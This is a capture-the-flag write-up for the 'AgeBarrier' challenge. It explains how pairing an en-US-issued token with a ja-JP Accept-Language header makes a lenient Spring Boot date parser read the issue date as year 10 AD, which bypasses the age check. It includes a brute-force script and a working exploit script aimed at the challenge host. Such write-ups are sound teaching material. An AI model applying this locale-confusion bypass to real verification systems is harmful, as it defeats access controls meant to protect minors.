

# Hey there!

This is a deep dive into the "AgeBarrier" CTF challenge from Abyss, a clever web security task that involved dissecting a "bleeding-edge" age verification system built on the Spring Boot framework. The solution required understanding a subtle but critical flaw in how the application handled dates and localization.

### **Challenge Overview**

*   **Name:** AgeBarrier
*   **Difficulty:** Medium
*   **Author:** Abyss
*   **Description:** The youngsters are easily bypassing age verification systems nowadays, so I made my very own bleeding-edge and future-proof age verification system. Surely, it's impenetrable?

***


### Part 1: Analyzing the Backend Logic

The first step was to understand the application's core. The source code revealed a fairly standard webapp with a few key components responsible for the age verification flow.

**Key Files:**

*   `ProductController.kt`: Handles the API endpoints for listing and claiming products.
*   `DefaultVerificationTokenService.kt`: Manages the creation and validation of JWT tokens used for verification.
*   `DefaultDateTimeFormatterProviderService.kt`: Provides a date formatter based on the user's locale.

The vulnerability is in between these services. When a user requests a new token from `/tokens`, the `DefaultVerificationTokenService` creates a JWT. The issuer claim of this token is set to the current time, formatted as a string.a

The crucial piece of code is in `DefaultDateTimeFormatterProviderService.kt`:

```kotlin
@Service
class DefaultDateTimeFormatterProviderService : DateTimeFormatterProviderService {
    override fun get(): DateTimeFormatter {
        return DateTimeFormatter.ofLocalizedDate(FormatStyle.SHORT)
            .withLocale(LocaleContextHolder.getLocale())
            .withResolverStyle(ResolverStyle.LENIENT)
    }
}
```

This reveals three critical facts:
1.  The date format is `SHORT`, which varies significantly between locales (e.g., `M/d/yy` for `en-US` vs. `dd.MM.yy` for `de-DE`).
2.  The locale is determined by `LocaleContextHolder.getLocale()`, which is populated from the incoming request's `Accept-Language` header. **This means we can control the date format.**
3.  The parser uses `ResolverStyle.LENIENT`. This is a big clue. A lenient resolver tries its best to interpret the content its given, often leading to unexpected results like rolling over invalid month values.

The attack vector became clear:
1.  Request a token using an `Accept-Language` header that formats the date in a specific way.
2.  Claim a product using that token, but with a *different* `Accept-Language` header that causes the server to misinterpret the date string from step 1 as a date far in the past.

### Part 2: The Journey of Trial and Error

My initial attempts involved finding locale pairs where the day/month/year order was swapped. I tried combinations like `en-CA` (`yy-MM-dd`) and `nl-NL` (`dd-MM-yy`). However, these attempts consistently failed with a `401 Unauthorized` error.

This was confusing. A `403 Forbidden` would imply the age check failed, but a `401 Unauthorized` meant the token itself was considered invalid. This happened because the date string was so incompatible between the locales that the lenient parser couldn't even make sense of it, throwing a `DateTimeParseException`. The `try-catch` block in `decodeToken` would catch this error and return a generic failure, leading to the `401`.

The key was not just to find formats that were different, but formats that were *ambiguous* and could be misinterpreted without failing to parse completely.

### Part 3: The Breakthrough - Finding the Golden Pair

After several failed attempts, a systematic, brute-force approach was the only logical next step. By scripting the process of requesting a token with one locale and immediately trying to use it with another, we managed to get a working locale pair.
```py
import requests
import sys
import json
import itertools

# Disable warnings for unverified HTTPS requests, common in challenge environments
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


LOCALES = ["en-US", "en-GB", "en-CA", "en-AU", "fr-FR", "fr-CA", "de-DE", "de-AT", "es-ES", "es-MX", "it-IT", "nl-NL", "pt-PT", "pt-BR", "sv-SE", "da-DK", "fi-FI", "is-IS", "no-NO", "pl-PL", "ru-RU", "ja-JP", "ko-KR", "zh-CN", "zh-TW", "ar-SA", "fa-IR", "hi-IN", "tr-TR", "el-GR", "cs-CZ", "hu-HU"]
def solve_challenge(base_url):
    token_url = f"{base_url}/tokens"
    product_url = f"{base_url}/products/3"
    print(f"[*] Target: {base_url}")
    print(f"[*] Beginning locale pair testing. This may take a few minutes...")
    # Create all possible pairs of locales (issuing_locale, parsing_locale)
    locale_pairs = list(itertools.product(LOCALES, repeat=2))
    total_pairs = len(locale_pairs)

    for i, (issuing_locale, parsing_locale) in enumerate(locale_pairs):
        # We don't need to test a locale against itself
        if issuing_locale == parsing_locale:
            continue

        progress_bar = f"[{i+1}/{total_pairs}]"
        print(f"\r{progress_bar} Testing pair: Issuer '{issuing_locale}', Parser '{parsing_locale}'...", end="", flush=True)
        
        try:
            with requests.Session() as session:
                token_headers = {'Accept-Language': issuing_locale}
                token_response = session.post(token_url, headers=token_headers, timeout=5, verify=False)
                if token_response.status_code != 200:
                    continue  
                verification_token = token_response.json().get('token')
                if not verification_token:
                    continue 
                # Step 2: Claim the product with the parsing locale
                claim_headers = {'Content-Type': 'application/json', 'Accept-Language': parsing_locale}
                claim_body = {'token': verification_token}
                claim_response = session.post(product_url, headers=claim_headers, json=claim_body, timeout=5, verify=False)

                # Check for success (200 OK)
                if claim_response.status_code == 200:
                    print(f"\n[+] Found a working locale combination: Issuer='{issuing_locale}', Parser='{parsing_locale}'")
                

        except (requests.exceptions.RequestException, json.JSONDecodeError):
            # Ignore any network or JSON errors and move to the next pair
            continue
    
    print("\n\n[!] Exhausted all locale pairs in the list without success.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python solve.py <host>")
        sys.exit(1)
    
    target_host = sys.argv[1]
    solve_challenge(target_host)
```
Running this bruteforce script gives us this:
```
C:\Users\Lenovo\Downloads\private_website\dist>python3 meow.py https://1c29aad8-5acb-40b7-8f3b-8c540de33f55.chall.nnsc.tf/
[*] Target: https://1c29aad8-5acb-40b7-8f3b-8c540de33f55.chall.nnsc.tf/
[*] Beginning locale pair testing. This may take a few minutes...
[22/1024] Testing pair: Issuer 'en-US', Parser 'ja-JP'...
[+] Found a working locale combination: Issuer='en-US', Parser='ja-JP'
```

A working combination was finally discovered: **`en-US`** and **`ja-JP`**.

Here is why this seemingly random pair works perfectly:

1.  **Token Issuing (`Accept-Language: en-US`):** The server uses the American `SHORT` date format, which is `M/d/yy`. For the date of the challenge (August 29, 2025), this generated the string: **`8/29/25`**.

2.  **Token Parsing (`Accept-Language: ja-JP`):** The server now switches its parser to the Japanese `SHORT` date format, which expects a pattern of `y/M/d` (year first).

3.  **The Misinterpretation:** The lenient parser receives the string `8/29/25` and applies the `y/M/d` pattern:
    *   It maps the first number (`8`) to the year (`y`), resulting in **Year 8 AD**.
    *   It maps the second number (`29`) to the month (`M`).
    *   It maps the third number (`25`) to the day (`d`).

Ordinarily, a month value of `29` is invalid. However, because the resolver is **lenient**, it "rolls over" the excess months. It calculates `29` months as **2 years and 5 months**. It then adds this to the base date, resulting in a final parsed date of **May 25, 0010 AD**.

This  date easily passed the age check, and the server returned the flag.

### Part 4: The Final Script


This final script removes the bruteforcing part and claims the flag.
```python
import requests
import sys
import json

# Disable warnings for unverified HTTPS requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def solve_challenge(host, port):
    base_url = f"https://{host}"
    token_url = f"{base_url}/tokens"
    product_url = f"{base_url}/products/3"

    print(f"[*] Target: {base_url}")

    with requests.Session() as session:
        # --- Step 1: Obtain a token with 'en-US' locale (M/d/yy format) ---
        print("[*] Step 1: Requesting a token with 'Accept-Language: en-US'...")
        token_headers = {'Accept-Language': 'en-US'}
        response = session.post(token_url, headers=token_headers, timeout=10, verify=False)
        response.raise_for_status()
        verification_token = response.json().get('token')
        print(f"[+] Successfully retrieved token.")

        # --- Step 2: Claim the flag with 'ja-JP' locale (expects y/M/d format) ---
        print("\n[*] Step 2: Claiming the flag with the token and 'Accept-Language: ja-JP'...")
        claim_headers = {
            'Content-Type': 'application/json',
            'Accept-Language': 'ja-JP'
        }
        claim_body = {'token': verification_token}
        response = session.post(product_url, headers=claim_headers, json=claim_body, timeout=10, verify=False)
        response.raise_for_status()
        flag = response.json().get('content')

        print("\n" + "="*40)
        print(f"  [SUCCESS] Flag retrieved!")
        print(f"  {flag}")
        print("="*40)

if __name__ == "__main__":
    solve_challenge("2848d092-2713-4d86-8665-7423ee31d19d.chall.nnsc.tf", "443")
```

### Conclusion

The "AgeBarrier" challenge was a fantastic example of how seemingly robust security measures can be undermined by small misconfigurations in internationalization libraries. It demonstrated that security is not just about the code you write, but also about understanding the behavior of the libraries you depend on. The danger of a lenient parser combined with user-controllable configuration proved to be the penetration of this "impenetrable" system.
